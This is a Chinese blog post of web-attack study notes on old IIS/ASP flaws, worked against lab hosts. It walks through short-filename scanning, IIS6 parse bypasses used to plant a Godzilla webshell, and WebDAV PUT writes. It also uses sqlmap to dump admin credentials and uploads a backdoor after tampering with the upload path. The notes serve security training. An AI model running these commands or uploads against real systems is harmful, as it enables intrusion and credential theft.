---
title: ASP应用&HTTP.SYS&短文件&文件解析&Access注入&数据库泄漏
published: 2025-10-25
description: 对ASP代码，IIS服务器漏洞的简单了解，以及sql注入问题与案例。
tags: [ASP,WEB攻防,SQL注入]
category: 网络安全
draft: false
---

## 内容总结

1. ASP因为access导致可以根据路径路由访问
2. HTTP.SYS蓝屏漏洞（使用msfconsole）
3. 学习IIS短文件。使用IIS短文件对目录进行扫描可以得到简短的dir。
4. IIS文件解析，运用哥斯拉创造1.asp，进行连接。1.asp.jpg的绕过1.asp;.jpg。

如果写个文件夹1，将文件1.asp放入进去。发现访问不了，但如果文件夹名改为1.asp那就可以访问成功。

5. IIS写权限，由于两个写入未关闭，postman使用put写入3.txt。
6. 模拟获得杭州电子科技大学的权限。
7. 报错与容错界面的区分，使用sqlmap进行注入网站杭州电子科技大学。
8. 通过三种方法寻找admin登录界面。
9. 通化抓包修改重发获得权限

## 章节点

> Web 层面： Web2.0 & Web3.0
>
> 语言安全： JS ， ASP ， PHP ， NET ， Java ， Python 等（包含框架类）
>
> OWTOP10 ：注入，文件安全， XSS ， RCE ， XXE ， CSRF ， SSRF ，反序列化，未授权访问等
>
> 业务逻辑：水平垂直越权，支付签约 & 购买充值，找回机制，数据并发，验证码 & 弱口令等
>
> 特殊漏洞： JWT ， CRLF ， CORS ，重定向， JSONP 回调，域名接管， DDOS ，接口枚举等
>
> 关键技术： POP 链构造， JS 逆向调试， NET 反编译， JAVA 反编译，代码解密，数据解密等
>
> Web3.0：待完续....

本章内容会比较少，只记录比较重要的部分，也可能没有笔记。因为现在已经是25年，感觉没这个必要去再去专门研究这个。

具体可以参考：[第41天：WEB攻防-ASP应用&HTTP.SYS&短文件&文件解析&Access注入&数据库泄漏_fyblog漏洞-CSDN博客](https://blog.csdn.net/m0_74930529/article/details/146101116?spm=1001.2101.3001.10796)

## IIS短文件

> 1. 漏洞描述
>    此漏洞实际是由HTTP请求中旧DOS 8.3名称约定(SFN)的代字符(~)波浪号引起的。它允许远程攻击者在Web根目录下公开文件和文件夹名称(不应该可被访问)。攻击者可以找到通常无法从外部直接访问的重要文件,并获取有关应用程序基础结构的信息。
>
> 2. 漏洞成因:
>    为了兼容16位MS-DOS程序,Windows为文件名较长的文件(和文件夹)生成了对应的windows 8.3短文件名。在Windows下查看对应的短文件名,可以使用命令**dir /x**
>
> 3. 应用场景：
>    后台路径获取，数据库文件获取，其他敏感文件获取等

使用工具

[GitHub - lijiejie/IIS_shortname_Scanner: an IIS shortname Scanner](https://github.com/lijiejie/IIS_shortname_Scanner)

命令如下：

```shell
python iis_shortname_scan.py http://192.168.200.140:88/
```

扫描出来可以对应上： 

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/f426847e3b7b41f69c0428a250e9809e.png" alt="img" style="zoom: 67%;" />

还可以继续在某一个指定路径下扫描：

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/cc9b9679561049aa82c603f6aa2ee6c4.png" alt="img" style="zoom:67%;" />

## IIS文件解析(配合文件上传)

> IIS 6 解析漏洞→可以上传木马文件，以图片形式或文件夹形式替换格式
>
> 1. 该版本默认会将***.asp;.jpg** 此种格式的文件名，当成Asp解析
>
> 2. 该版本默认会将***.asp/目录下的所有文件当成Asp解析**。
>    如：logo.asp;.jpg xx.asp/logo.jpg
>
> IIS 7.x 解析漏洞
>
> 在一个文件路径(/xx.jpg)后面加上/xx.php会将/xx.jpg/xx.php 解析为php文件
> 应用场景：配合文件上传获取Webshell

### 演示一：

第一种情况：

内容是使用哥斯拉生成一个asp文件，之后把生成的asp文件放入网站根目录，进行连接，这个肯定是成功的。但是把asp文件再加上.jpg，这时就会被识别为图片，使用哥斯拉再进行连接时候，会提示初始化失败。

此时利用IIS6的解析漏洞，在.jpg前加分号，再进行尝试发现，连接正常，可以访问到网站的目录中的所有内容。

还有一种情况：

把asp文件改为.jpg放入创建的文件夹中，文件夹名随意，这种情况也是连接失败的。但是当把文件夹名改为xxx.asp时，就可以进行连接了。

### 演示二：

> IIS写权限
> IIS<=6.0 目录权限开启写入，开启WebDAV，设置为允许
> 可以通过提交put包，进行写入文件（可置入木马，获得权限）
> 参考利用：https://cloud.tencent.com/developer/article/2050105

主要漏洞其实也就是在进行网站搭建时，勾选上了写入。

图源：文章开头的文章链接处。

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/a03245954c224a1fb730febd04f71589.png)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/e6a0c30a4c624a42992b2d390e92f9f9.png)

由于以上的写入开启导致使用postman的put写入一个3.txt进入网站：

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/59e23f369163462db43a785cdff085fd.png" alt="img" style="zoom:67%;" />

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/b79d80a564254506b4c0296675711ed5.png)

## SQL注入

### 案例1

通过访问PIC.asp得到查询方法是通过改变select后面的值classid值。

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/aa43b09fb3f84c75be328efc7e924778.png)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/db06fa88c8854c25b728b551ecc76ca5.png)

其实在真实情况下进行sql注入时，并不需要什么万能密码，只需要在后面随便插入一些数据，之后看返回的内容是什么样，如果没有反应或者出现容错页面那就说明不存在注入点。在有注入点的情况下，页面返回的内容肯定是有sql语句执行错误内容返回（一定要是sql语句执行的报错，而不是代码处理的报错，或者是404页面，这些都是不存在注入点的）。

使用sqlmap进行注入：

```shell
python .\sqlmap.py -u "http://192.168.157.128:89/Pic.asp?classid=3" ---tables
```

证明有漏洞存在：

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/69ea34b3855e4c9d9bc821bbf4020ffa.png" alt="img" style="zoom:80%;" />

使用第一个库，之后使用10线程来跑。当发现关键信息admin时可以停止。 

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4cb8db6d16c1407d90ccc46c97c9c59a.png" alt="img" style="zoom:80%;" />

```shell
G:\develop\safety\ONE-FOX集成工具箱_V3.0魔改版_by狐狸\gui_scan\sqlmap

python sqlmap.py -u “” --tables // 获取表名
python sqlmap.py -u “” --cloumns -T admin // 获取admin表名下的列名
python sqlmap.py -u “” --dump -C “username,password” -T admin // 获取表名下的列名数据

python .\sqlmap.py -u “http://192.168.200.140:89/Pic.asp?classid=3” --tables

python .\\sqlmap.py：启动 SQLMap 工具，使用 Python 解释器运行。

u "<http://192.168.200.140:89/Pic.asp?classid=3>"：指定目标 URL，即要测试的网站地址。在这个例子中，目标 URL 是 http://192.168.200.140:89/Pic.asp?classid=3。u 选项用于指定 URL。

-tables：指定 SQLMap 工具执行的任务，这里是获取数据库中的所有表。
-tables：选项用于请求表的信息。
-columns：选项用于请求列的信息
```

现在开始跑admin下面的列：

```shell
python .\sqlmap.py -u "http://192.168.157.128:89/Pic.asp?classid=3" --columns -T admin
```

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/e8a8afac366e4ad688fe89090e3819fc.png" alt="img" style="zoom:80%;" />

现在开始获取username和password：

```shell
python .\sqlmap.py -u "http://192.168.157.128:89/Pic.asp?classid=3" --dump -C “username,password” -T admin
```

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/afa182321aa9475387b65d3e228eb516.png" alt="img" style="zoom:80%;" />

之后就可以通过md5解密得到密钥。

#### 寻找登陆界面

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/ee2dbf9bca5e49eda56be1bf0b19431d.png)

##### 方法一：使用漏洞探针

```shell
python iis_shortname_scan.py http://192.168.157.128:89/
```

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/9a39f95c918e46f9b5e6cb2b67676c45.png" alt="img" style="zoom:80%;" />

通过尝试访问：http://192.168.157.128:89/upfile.asp

得到：http://192.168.157.128:89/Tcnet/Admin_Login.asp

##### 方法二：通过7kb扫描获取访问路径

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/c8772a9cdc884834b0a4482020cfb28e.png" alt="img" style="zoom: 50%;" />

##### 方法三

使用爬虫在新闻系统网页中寻找：

发现在网页源代码771行。

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/0775ba7ed270400abd5fef487ee70b8b.png" alt="img" style="zoom:80%;" />

##### 获得网站权限

访问http://192.168.157.128:89/upload.asp，先测试可以上传的文件类型，发现会对文件进行检测。

此时使用使用bp进行抓包，修改代理配置。

先上传一个正常的图像，进行抓包：

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/ef36ad03551c417793cd3373982452f9.png" alt="img" style="zoom: 50%;" />

将其放入repeater当中：

对filepath进行修改发送，发现发送的值会在前面增加。

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/d735753f20734038a803fa0739659767.png" alt="img" style="zoom: 67%;" />

这时就可以在前面放入后门1.asp;

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/df550676a8e94594996129cd0c35a3d3.png" alt="img" style="zoom:67%;" />

上传成功后进行对该文件的访问，发现存在也就是上传成功了： 

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/38f611b40bf748259321aae50a2929dc.png" alt="img" style="zoom:67%;" />

这时使用哥斯拉通过连接http://192.168.157.128:89/1.asp;2025381193763558.png，即可成功拿到权限。

